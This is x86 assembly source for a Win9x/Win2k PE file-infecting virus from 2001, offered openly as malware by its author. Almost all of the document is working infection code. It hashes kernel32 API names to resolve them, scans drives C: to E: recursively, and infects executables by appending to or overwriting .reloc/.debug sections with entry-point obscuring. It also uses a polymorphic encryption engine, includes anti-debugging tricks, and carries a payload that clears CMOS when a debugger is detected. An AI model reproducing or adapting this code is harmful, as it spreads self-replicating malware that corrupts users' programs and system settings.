;==============================================================================
;                   Win9x/Win2k.Society.3434 (c) necr0mancer
;				december 2001
;ring-3 PE infector
;
;Features:
;
; *     Works only in win2k & win9x,but can work on winNT(I haven't it!) if
;       you add it kernel base on table (see source).
; *     Polymorphic (use NPE32 engine).
; *     Some infection methods (EPO,standart, .reloc OR .debug overwrite).
; *     Simple antidebug.
; *     Payload (on trace with td32:)) CMOS kill.)
; *     Not infecting winzip self-extactors & upx-packed files
;
;Tnx: to all who write stuff.
;                          Infection sheme:
;
;==============================================================================
;                           �����������Ŀ
;                           �   main    �     �����  - incorect secton size
;                           �������������
;                           �����������Ŀ
;                           � find reloc�
;                           �������������
;                       �������������������Ŀ
;                    ������Ŀ           ������Ŀ
;    ���������������Ĵfinded������ͻ    �failed�
;    �               ��������      �    ��������
;    �        ���������������Ŀ    �   �������������Ŀ
;    �        � EPO infection �  �����Ĵ find .debug �
;    �        �����������������  � �   ���������������
;    �                           � �        �
;    � ��������������������Ŀ    � �   ���������������������Ŀ
;    �ĴOverwrite infection ������ ���͵"standart" infection �
;      ����������������������          �����������������������
;
;
;==============================================================================



include  1.inc
include  win.inc

PAGE_READWRITE equ  4
FILE_MAP_WRITE equ  2
DEBUG          equ  0                                   ;no debug-release;)

extrn   MessageBoxA:near
extrn   ExitProcess:near


VIRTUAL_SIZE  equ (offset _endvbody-offset _start)
PHYSICAL_SIZE equ (offset _fbodyend-offset _start)
DEBUG         equ 0

        .586p
        .model flat

        .data

message_title  db '[Dekadance] has been start.',0

_message       db 'Credo:',0dh
               db 'Dekadance is lifestyle.',0dh,0dh
               db 'Copyleft (c) 2001 necr0mancer',0
        .code

_emulation:

                push eax                                ;jmp viri
                xor eax,eax
                jmp _callz_manager

Original:

                push MB_ICONEXCLAMATION
                push offset message_title
                push offset _message
                push 0
                call MessageBoxA

                push    0
                call ExitProcess                        ; call    ExitProcess

;------------------------------------------------------------------------------
;Run loader
_callz_manager:

                pushfd                                  ;save flags&regs
                pusha

@cm             equ             <-offset @@GetDelta>

                call @@GetDelta                         ;get delta
@@GetDelta:
                pop ebp

if  DEBUG eq 1
                int 3
endif


                and eax,0ffh                            ;AL=# in function table
                push eax
                push ebp

                xor edi,edi

nop_call:
                call _start
                pop ebp

                push edi
                lea edi,[ebp+nop_call @cm]
                mov eax,90909090h                       ;write nop for next call
                stosd
                stosb
                pop edi

                pop eax                                 ;eax=# in function table
                shl eax,3                               ;eax*8

                or edi,edi                              ;first mng_call?
                jnz table_offset_exist

                db (0b8h OR __edi)                      ;mov edi,xxxxxxxx
                delta_tbl dd 0

                jmp short get_me_out

table_offset_exist:

                mov [ebp+delta_tbl @cm],edi             ;save table_pointer
                                                        ;for next calls
get_me_out:
                lea edi,[edi+eax]

                mov eax,[esp+8*4+4]                     ;restore old eax
                mov [esp._eax],eax
                mov [esp+8*4+4],edi                     ;write ret adr

                popa
                popfd
                ret

;==============================================================================
;Virii part

@ex             equ             <-offset Delta>

_start:
                call Delta                              ;get Delta
Delta:

if DEBUG eq 1
                int 3
endif
                pop ebp
                jmp short AfterData                     ;go to main part

;                          === some data ===

imagebase       dd 00400000h
OldRVA          dd (offset Original-00400000h)
fmask           db '*.exe',0

tbl:

                dd 77e80000h
                dd 0Bff70000h
                dd 0

jmp_table:
                mov eax,offset Original
                jmp eax
                dq 9 dup (0)

Mask_table:

                db 2
                dw 025FFh                               ;jmp xxxxxxx
                db 0
                db 0
                db 0

;=============================================================================
Fsize           dd ?
Voff            dd ?
Foff            dd ?
MZbase          dd ?

AfterData:

                db 0b8h                                 ;mov eax,xxxxxxxx
                reTT_need dd 1                          ;flag of type infection

                or eax,eax
                jnz no_need_heh

                mov eax,[ebp+OldRVA @ex]                ;restore old entrypoint
                add eax,[ebp+imagebase @ex]
                push eax                                ;FOR returning in prog

no_need_heh:

                lea esi,[ebp+jmp_table @ex]             ;copy adr_table
                lea edi,[ebp+jmp_tmp_table @ex]
                mov ecx,10*2
                rep movsd

                lea eax,[ebp+offset @@@error_handle @ex];find kernel base
                push eax

                xor eax,eax
                push 4 ptr fs:[eax]                     ;set SEH
                mov fs:[eax],esp

                lea esi,[ebp+offset tbl @ex]            ;possible kernel bases
                lea edi,[ebp+offset __kernel32 @ex]

                pusha
                jmp _lodsd
_ex:
                pop 4 ptr fs:[eax]                      ;restore SEH
                pop eax                                 ;
                jmp no_yet                              ;& exit

;=============================================================================

@@@error_handle:

                mov esp,[esp+8]
                sub esp,20h

_lodsd:
                popa
                lodsd
                or eax,eax                              ;end of table ?
                je _ex
                mov [edi],eax
                pusha

                db 0b8h
__kernel32      dd 0


                cmp word ptr[eax],'ZM'                  ;test on MZ
                jne _lodsd
__ok:
                xchg eax,ebx
                xor eax,eax
                add esp,20h
                pop 4 ptr fs:[eax]                      ;restore SEH
                pop eax

;==============================================================================

sys_ok:

                lea esi,[ebp+offset _Table @ex]         ;table of CRC32
                lea edi,[ebp+offset _adr @ex]           ;table of needed
                                                        ;function's adresses
Ft_repeat:

                call get_proc_adr                       ;find adress

                or eax,eax                              ;no finded :(
                jz  end_Ft_cycle
                stosd

                jmp Ft_repeat

end_Ft_cycle:


                out 70h,al                              ;
                in al,71h                               ;
                inc al                                  ;
                shl eax,8                               ;
                mov ecx,1000000                         ; GET RANDOM NUMBER
                loop $                                  ;
                out 70h,al                              ;
                in al,71h                               ;
                not eax
                                                        ; save it
                mov [ebp+__seed @ex],eax                ; for virii
                inc eax                                 ;
                mov [ebp+runSeed @ex],eax               ; and for NPE


                xor eax,eax                             ;files infected=0
                mov 4 ptr[ebp+FileNum @ex],eax

                mov [ebp+our_ebp @ex],ebp               ;save current delta
                                                        ;for creating thread

                xor ebx,ebx                             ;ebx=0

                lea eax,[ebp+offset Thr_indefirer @ex]
                push eax

                push ebx                                ;push 0
                push ebx                                ;push 0

                lea eax,[ebp+offset Thread_proc @ex]    ;offset to thread proc
                push eax

                push ebx                                ;push 0
                push ebx                                ;push 0
                call [ebp+CreateThread @ex]             ;Create thread

no_yet:
                lea edi,[ebp+offset jmp_tmp_table @ex]  ;get jmp_table pointer
                                                        ;to calls_manager
                retn                                    ;exit to parent code

Thread_proc:

                db (0b8h or __ebp)                      ;mov ebp,xxxxxxxx
                our_ebp dd 0

                lea edi,[ebp+SearchRec @ex]
                lea edx,[ebp+dirname @ex]
                mov [edx],'\:C'
                call filefind                           ;infect drives

                mov [edx],'\:D'
                call filefind

                mov [edx],'\:E'
                call filefind

                db 0b8h                                 ;mov eax,xxxxxxxx
Thr_indefirer   dd 0

                push eax
                call [ebp+ExitThread @ex]               ;good bye!

;=========================================================================================
;Input: esi=offset of string
;       ebx=kernel adr
;Out  : eax=adr(if has finded;))

get_proc_adr       proc

                push edi

                push eax
                lodsd
                mov [ebp+crc32 @ex],eax                 ;save getted crc
                pop eax

                mov ecx,[ebx+3ch]                       ;PE-header offset
                add ecx,ebx

                mov ecx,[ecx+78h]                       ;Export table offset
                jecxz return_0                          ;if (et=null) then err

                add ecx,ebx                             ;ecx-offset of export
                                                        ;table
                xor edi,edi
_search:

                mov edx,[ecx+20h]                       ;offsets on FuncNames
                add edx,ebx                             ;correct on base

                mov edx,[edx+edi*4]
                add edx,ebx

                push esi                                ;crc table
                push ecx                                ;base

                mov esi,edx
                push edx

find_zero:

                lodsb
                or al,al
                jnz find_zero
                dec esi

                sub esi,edx
                xchg ecx,esi

                pop esi
                call CRC32

                db (0b8h or __edx)                      ;mov edx,crc
                crc32  dd 0

                pop ecx                                 ;base
                pop esi                                 ;table

                cmp edx,eax
                je _name_found

                inc edi
                cmp edi,[ecx+18h]
                jb _search

return_0:

                xor eax,eax                             ;error ocures
                jmp _return

_name_found:
                                                        ;esi=index on string table
                mov edx,[ecx+24h]
                add edx,ebx
                movzx edx,word ptr [edx+edi*2]

                mov eax,[ecx+1ch]                       ;AdrTable
                add eax,ebx                             ;correct on base

                mov eax,[eax+edx*4]
                add eax,ebx                             ;get adress of nedded function

_return:

                pop edi                                 ;in output eax
                retn
get_proc_adr       endp


;=============================================================================
;                               INFECT
;=============================================================================

infect  proc
                pushad

                mov esi,edx                             ;esi=edx=full name

_findzero:
                lodsb
                or al,al
                jnz _findzero
                                                        ;esi=offset of null byte+1
                mov eax,[esi-4]

                cmp eax,00455845h                       ;EXE?
                je exe_infect

                cmp eax,00657865h                       ;exe?
                jne no_EXE

exe_infect:

                cmp byte ptr [ebp+FileNum @ex],15
                ja no_EXE                               ;More than 15 files?

_gogo:
                call fopen                              ;edx=FileName

                or eax,eax                              ;error ocures?
                je i_close_exit

                xchg ebx,eax                            ;ebx=handle
                call f_createmap                        ;createfilemapping

                mov [ebp+MZbase @ex],eax
                xchg eax,edx                            ;edx=mem_adr

                mov ax,word ptr[edx+18h]
                cmp al,40h
                jne i_close_exit

                mov eax,[edx+3ch]
                add edx,eax                             ;EDX=offset of PE header
                mov eax,[edx]
                cmp ax,'EP'                             ;really PE ?
                jne i_close_exit


;get last section

                movzx eax,word ptr[edx+14h]             ;NT header size
                add eax,18h                             ;Size of PE-header
                add eax,edx                             ;Eax=offset of Object table

                push eax
                push edx

                movzx eax,word ptr[edx+6h]              ;Number of objects

                dec eax
                smov esi,40                             ;size of table
                mul esi                                 ;result in EDX:EAX

                xchg esi,eax                            ;ESI=offset of last object

                pop edx
                pop eax

                mov edi,eax                             ;edi=Object-table
                add esi,eax                             ;correct(esi=last object)

                push edi

;=============================================================================

;find  winzip or UPX0

                mov al,1
                movzx ecx,word ptr[edx+6h]              ;Number of objects
find_upx:

                cmp 4 ptr[edi],'niw_'                   ;_winzip_
                je zip_upx

                cmp 4 ptr[edi],'0XPU'                   ;UPX0
                je zip_upx

                add edi,40
loop   find_upx

                xor eax,eax
zip_upx:
;=============================================================================
                pop edi
                or eax,eax
                jnz i_close_exit

                mov eax,[edx+34h]                       ;get & save imagebase
                mov [ebp+imagebase @ex],eax

                mov ecx,[esi+10h]                       ;get Fsize
                mov [ebp+Fsize @ex],ecx

                mov eax,[esi+8h]                        ;get Vsize
                or eax,eax                              ;Vsize=0?
                jz i_close_exit

                or ecx,ecx                              ;Fsize=0?
                jz i_close_exit

                cmp eax,ecx                             ;Vsize<Fsize
                jb i_close_exit

                mov eax,[esi+14h]                       ;get Foffset
                mov [ebp+Foff @ex],eax

                mov eax,[esi+0Ch]                       ;get Voffset
                mov [ebp+Voff @ex],eax

                mov ecx,'emit'                          ;check & write sign
                cmp [edx+08h],ecx
                je i_close_exit
                mov [edx+08h],ecx

                push esi                                ;esi=last (copy)
                push eax                                ;SAve VO of virii
                push edi                                ;obj-table offst



;find .reloc section
                movzx ecx,word ptr[edx+6h]              ;Number of objects
find_reloc:

                cmp 4 ptr[edi],'ler.'                   ;.reloc
                je question_EPO

                add edi,40
loop            find_reloc

;==============================================================================
;find .debug section

                pop edi                                 ;begin of sections tabl.
                movzx ecx,word ptr[edx+6h]              ;Number of objects
find_debug:
                cmp 4 ptr[edi],'bed.'                   ;.debug
                je @@reloc_debug_finded

                add edi,40
loop   find_debug

;==============================================================================
;neither .reloc nor .debug not finded

                jmp @@Standart

@@reloc_finded_stack:

                pop eax                                 ;clear stack

@@reloc_debug_finded:                                   ;.reloc or .debug are finded

                mov eax,[ebp+MZbase @ex]                ;begin of Exe
                add eax,[edi+14h]                       ;esi=Physical_Offset of .debug section
                mov 4 ptr[ebp+reloc_offset @ex],eax
@@Overwrite:
                add esp,4*2

                xor ecx,ecx
                mov [ebp+reTT_need @ex],ecx             ;set flag @@overwrite=0

                xchg edi,esi                            ;esi=.reloc secton

                lea eax,[edx+28h]                       ;set new RVA
                mov ecx,[eax]
                or ecx,ecx
                jz   i_close_exit                       ;RVA=0

                mov [ebp+OldRVA @ex],ecx

                mov ecx,[esi+0ch]                       ;section RVA
                mov [eax],ecx

                mov eax,10000                           ;get 10 kb
                call GetMem

                push eax
                xchg edi,eax

                call call_NPE32                         ;edi=bufer dectination

                mov  [esi+24h],0E0000020h               ;set attributes
                add  [esi+10h],ecx                      ;Add virus size

                xchg edi,esi                            ;esi=data
                db (0B8h or __edi)                      ;mov edi,xxxxxxxx
reloc_offset  dd 0
                rep movsb                               ;write virii

                jmp common_exit

@@Standart:
                pop esi                                 ;<<<clear stack
                pop esi

                xor ecx,ecx
                mov [ebp+reTT_need @ex],ecx             ;set flag @@overwrite=0

                lea edi,[edx+28h]                       ;set new RVA
                mov ecx,[edi]
                or ecx,ecx                              ;RVA==0    ?
                jz   i_close_exit

                mov [ebp+OldRVA @ex],ecx
                mov eax,[ebp+Voff @ex]
                add eax,[ebp+Fsize @ex]                 ;eax=virtual offset+physic size=new RVA
                mov [edi],eax

                mov eax,10000                           ;10 kb
                call GetMem
                push eax
                xchg edi,eax

                mov ecx,[edx+38h]                       ;Virtual aligment
                mov eax,VIRTUAL_SIZE+400h*2             ;add 2 kb for decryptor
                call Round                              ;align to phys_aligment

                add  [esi+08h],eax                      ;Add virus size to section
                mov  eax,[esi+08h]

                mov ecx,[ebp+Voff @ex]                  ;Virtual offset+virtualsize
                add ecx,eax
                mov [edx+50h],ecx                       ;Correct imageSize

                mov [esi+24h],0E0000020h                ;set attributes

                call call_NPE32
                add  [esi+10h],ecx                      ;Add virus size

                push ecx
                mov ecx,[ebp+Foff @ex]
                add ecx,[ebp+Fsize @ex]                ;Offset of end of last section
                call fseek
                pop ecx                                ;restore cpypted_size

                call fwrite                            ;write virii

                jmp common_exit

;==============================================================================
question_EPO:

                cmp 4 ptr[edi+10h],PHYSICAL_SIZE+900h   ;check section size
                jnb size_s_ok

                pop eax                                 ;<<<clear stack
                jmp @@Standart                          ;standart infect
size_s_ok:                                              ;if reloc < virsize

                smov eax,3                              ;max 2
                call randomGen                          ;get random number

                or eax,eax                              ;0 = make overwrite
                jnz _dbg                                ;1 = make EPO
                                                        ;2 = debugers sucks:)
                                                        ; & EPO
_clear_one_param:

;               pop eax                                 ;<<<clear stack
;               jmp @@reloc_debug_finded
                jmp @@reloc_finded_stack

_dbg:
                dec eax                                 ;eax==1?
                jz @@reloc_EPO

                call Debuger_fuckup

@@reloc_EPO:

                pop eax                                 ;first obj.

                inc 4 ptr[ebp+reTT_need @ex]            ;set flag @@overwrite
                                                        ;into 1 or whatever value

                mov esi,[ebp+MZbase @ex]                ;begin of Exe
                add esi,[eax+14h]                       ;esi==Physical_Offset of first section

                pop eax                                 ;clear stack<<<<

                mov eax,[ebp+Voff @ex]
                add eax,[ebp+Fsize @ex]                 ;eax=virtual offset
                                                        ;+physic size=new RVA

                mov ecx,[edi+0ch]                       ;get section RVA

                pop eax                                 ;clear stack<<<<
                push edi                                ;.reloc offset

                mov edi,[edi+14h]                       ;edi=offset of .reloc section
                add edi,4 ptr[ebp+MZbase @ex]           ;correct on begin of file

                mov eax,400h                            ;write_some_garbage
                call randomGen
                inc eax
                add ecx,eax                             ;correct RVA_reloc

                add eax,edi
                mov [ebp+EPO_edi @ex],eax

                lea eax,[ebp+Mask_table @ex]
                push eax

                lea eax,[ebp+replace @ex]
                push eax

                smov eax,10                             ;get random (max 10)
                call randomGen
                inc eax

                push eax                                ;count of functions
                push edi                                ;RELOC offset
                push esi                                ;CODE  offset
                push ecx                                ;virtual offset

;-----------------------------------------------------------------------------
;Create_UEP(
;       dword   VO                      // virtual offset
;       *dword  code                    // offset to .code section(already has read)
;       *dword  reloc                   // offset to .reloc section(already has read)
;       dword   num_records             // count of records in table to rewrite
;       *dword  adr_modify              // address of "replasing" proc
;       *dword  mask_table              // pointer to a mask table
;        );
;-----------------------------------------------------------------------------

                call Create_UEP

                pop esi                                 ;restore original esi
                jc  i_close_exit                        ;no_relocs_finded :(

                mov eax,10000                           ;get 10 kb
                call GetMem
                push eax
                xchg edi,eax                            ;edi=mem

                call call_NPE32                         ;cpypt virii

                add  [esi+10h],ecx                      ;Add virus size
                mov  [esi+24h],0E0000020h               ;set attributes

                push ecx
                push edi

                db (0b8h or __edi)                      ;mov edi,EPO_edi
                EPO_edi dd 0

                lea esi,[ebp+c_manager @ex]
                mov ecx,cm_size                         ;manager size
                rep movsb                               ;copy "manager"

                pop esi
                pop ecx
                rep movsb                               ;copy virii

common_exit:

                call [ebp+GlobalFree @ex]               ;free memory
                inc byte ptr [ebp+FileNum @ex]

i_close_exit:

                call  f_closemap                        ;unmap file from memory
                call  fclose                            ;close file
no_EXE:

                popad
                retn

infect  endp

;==============================================================================
;In: edx=dirname
;    edi=SearchRec
filefind  proc
                pushad

                sub   esp,1024                          ;for full directory name

                mov esi,edx                             ;esi=offset of dirname
                mov edi,esp                             ;edi=memory for FULL dirname

_scopy:
                lodsb
                stosb
                or al,al                                ;end of ASCIIZ string?
                jnz _scopy

                dec edi

                mov al,'\'                              ;add '\' if need
                cmp [edi-1],al
                je _estislesh
                stosb
_estislesh:

                mov esi,edi                             ;esi=position for file/dir

                mov eax,'*.*'
                stosd
                mov eax,esp

                mov edi,[esp+1024]                      ;restore edi
                push  edi

                push  eax

                call  [ebp+FindFirstFile @ex]           ;eax=handle for search

                inc eax
                jz    ff_quit                           ;cmp eax,-1
                dec eax

                xchg  ebx,eax                           ;search handle

ff_infect:

                push ecx                                ;pause
                mov ecx,1000000
                loop $
                pop ecx


                pushad
                xchg esi,edi                            ;edi=position of file/dir,esi=ff_struc
                lea esi,[esi].ff_fullname               ;esi=finded name
_sadd:

                lodsb                                   ;string add
                stosb
                or al,al
                jnz _sadd
                popad

                mov edx,esp                             ;FULL name of file/dir

                test  byte ptr [edi].ff_attr, 16
                jnz   ff_dir                            ;dir?

                call  infect                            ;no dir,infect
                jmp ff_next

ff_dir:

                cmp  byte ptr [edi].ff_fullname,'.'
                je   ff_next

                call filefind

ff_next:

                push edi
                push ebx
                call [ebp+FindNextFile @ex]

                or eax,eax
                jnz   ff_infect                         ;no dirs/files?

ff_quit:

                push ebx
                call [ebp+FindClose @ex]

                add esp,1024

                popad
                retn
filefind  endp


;==============================================================================
;In  : edi=bufer
;Out : ecx=size generated
;modify :eax,edx,ecx
call_NPE32      proc

		call Debuger_fuckup

                push ebx
                push edx
                xor eax,eax
                inc eax
                cpuid                                   ;get unical value
                xor eax,edx                             ;for this CPU
                pop edx
                pop ebx

                push eax                                ;move it in flags

                mov eax,[ebp+offset runSeed @ex]
                push eax                                ;seed (or NULL)

                xor eax,eax
                mov [ebp+offset runSeed @ex],eax        ;seed has been
                                                        ;inicialized == NULL

_push_size:

                mov eax,PHYSICAL_SIZE
                push eax                                ;size

                push edi                                ;bufer

                lea eax,[ebp+offset _start @ex]         ;data
                push eax


;==============================================================================
;int NPE_main(
;      offset data
;      offset bufer
;      count_bytes
;      seed (nul if not 1st generation)
;      flags
;      )
;==============================================================================

                call npe_main                           ;out eax=size
                xchg ecx,eax
                jnc  e_call_npe32                       ;if no errors

;----------------               error              ------------------

                mov ecx,PHYSICAL_SIZE
                pusha
                lea esi,[ebp+offset _start @ex]         ;data
                ;edi = bufer
                rep movsb                               ;copy virii to bufer
                popa
e_call_npe32:
                retn
call_NPE32      endp
;==============================================================================


GetMem  proc

                pusha
                push eax
                push GMEM_FIXED
                call [ebp+GlobalAlloc @ex]              ;GetMemory
                ;eax=offset of getted memory

                mov [esp._eax],eax
                popa

                retn
GetMem  endp

;==============================================================================
;Input:ecx=field of rounding
;      eax=size
Round   proc
                bsr ecx,eax                             ;Scan backward for bit

                dec ecx

                shr eax,cl
                inc eax
                shl eax,cl

                retn
Round   endp

;==============================================================================
CRC32   proc
                pusha

                db (0b8h or __ebx)                      ;mov ebx,polinom
                polinom dd 04c11db7h

                xor edx,edx
next_8_bites:
                push ecx

                xor eax,eax
                lodsb
                shl  eax,32-8-1
                smov ecx,8
carry_find:

                shl eax,1
                shld edx,eax,1
                jnc not_carry

                xor edx,ebx
not_carry:

                loop carry_find

                pop ecx

                loop next_8_bites


                ;add null bites

                smov ecx,32+8+1
@carry_find:
                shl edx,1
                jnc @not_carry
                xor edx,ebx

@not_carry:
                loop    @carry_find

                mov [esp._eax],edx                      ;return CRc in eax

                popa
                ret
CRC32   endp

;==============================================================================
replace:

;=== copy old jumper to table===
;ecx=#of finded
;edi=offst of command(cor)
;ebx=offset of commnd(phys)
;esi=setted virtual offset
        pusha

        push esi

        push edi
        xchg edi,esi
        lea edi,[(ebp+offset jmp_table)+ecx*8 @ex] ;num in table
        movsd
        movsd
        pop edi

        mov ax,0b050h                   ;push eax+mov al
        stosw

       ;ecx=count/index
        xchg eax,ecx                     ;eax=num records param
        mov ah,0e9h                      ;jmp.....
        stosw

        pop eax                         ;VO
        sub eax,ebx
        sub eax,5+3                      ;Pa3Huya
        stosd

        popa
        retn
;==============================================================================






;=============================================================================
randomGen       proc
                pusha
                push eax                                ;save max_random

                db 0b8h                                 ;mov eax,xxxxxxxx
                __seed dd 12345678h

                mov edi,134775813                       ;eax=new seed
                mul edi                                 ;EDX:EAX=EAX*EDI
                inc eax
                mov [ebp+__seed @ex],eax

                xor edx,edx

                pop ecx
                or ecx,ecx                              ;max_random=0
                jz __div_0
                div ecx

                mov [esp._eax],edx

__div_0:
                popa
                ret
randomGen       endp

;=============================================================================
Debuger_fuckup          proc
                pusha

                call [ebp+IsDebuggerPresent @ex]        ;catch stupid TD32 ;)
                or eax,eax
                jnz fuckup

                push edi
                sidt [esp-2]
                pop  edi

                mov [edi+1*8],eax                       ;kill int 1
                mov [edi+3*8],eax                       ;kill int 3

                mov dr0,eax                             ;kill debug system regs
                mov dr1,eax                             ;NOTE:
                mov dr2,eax                             ;  SoftIce is interrupts
                mov dr3,eax                             ;  this commands &
                                                        ;  virii suck.
                popa
                retn

fuckup:
                smov eax,5eh                            ;Clear CMOS
                smov edx,70h
                call PM_out

                xor eax,eax
                smov edx,71h
                call PM_out

                jmp $

;=============================================================================
PM_out          proc

                push    eax
                push    edx
                mov     edx, esp
                smov     eax,0F7h                       ;WRITE_PORT_UCHAR
                int     2Eh
                add     esp, 2*4
                retn
PM_out          endp
;=============================================================================

Debuger_fuckup          endp

c_manager:
include call_mng.inc
cm_size equ $-offset c_manager

include RIPbin.inc
include ring3io.inc
include npe32bin.inc


_Table:

_CreateFileA            dd              0830F55B4h
_CreateFileMapping      dd              06817C213h
_MapViewOfFile          dd              0CF4C00A1h
_UnmapViewOfFile        dd              0C027BC23h

_CloseHandle            dd              07CD0735Bh

_ReadFile               dd              02804FB4Dh
_FindFirstFileA         dd              0A32BE888h
_FindNextFileA          dd              0233AEB5Eh
_FindClose              dd              0E6CCF387h
_GlobalAlloc            dd              06CCA7EE0h
_GlobalFree             dd              04753EBE5h
_SetFilePointer         dd              0E747C386h
_WriteFile              dd              018D5ABDFh
_GetCurrentDirectoryA   dd              0B089B6BEh
_IsDebuggerPresent      dd              015B27F29h
_ExitThread             dd              01E799321h
_CreateThread           dd              072F17A7Bh

its_over                dd              0FFFFFFFFh
_fbodyend:




_adr:
CreateFile              dd      ?           ;2

CreateFileMappingA      dd      ?
MapViewOfFile           dd      ?
UnmapViewOfFile         dd      ?

CloseHandle             dd      ?           ;3
ReadFile                dd      ?           ;4
FindFirstFile           dd      ?           ;6
FindNextFile            dd      ?           ;7
FindClose               dd      ?           ;8
GlobalAlloc             dd      ?           ;9
GlobalFree              dd      ?           ;a
SetFilePointer          dd      ?           ;b
WriteFile               dd      ?           ;c
GetCurrentDirectory     dd      ?     ;d
IsDebuggerPresent       dd      ?
ExitThread              dd      ?
CreateThread            dd      ?

;-------------------------------------

curdir          db 260 dup (?)
SearchRec       f_struc<,,,,,,,>

DirNum          db ?
FileNum         db ?
bytesread       dd ?


first_run_npe   dd ?
runSeed         dd ?
dirname         dd ?

jmp_tmp_table:
               dq 10 dup (?)
_endvbody:
end _emulation

;==============================================================================
;							 (C) necr0mancer 2001
;                            			  necr0mancer2001@hotmail.com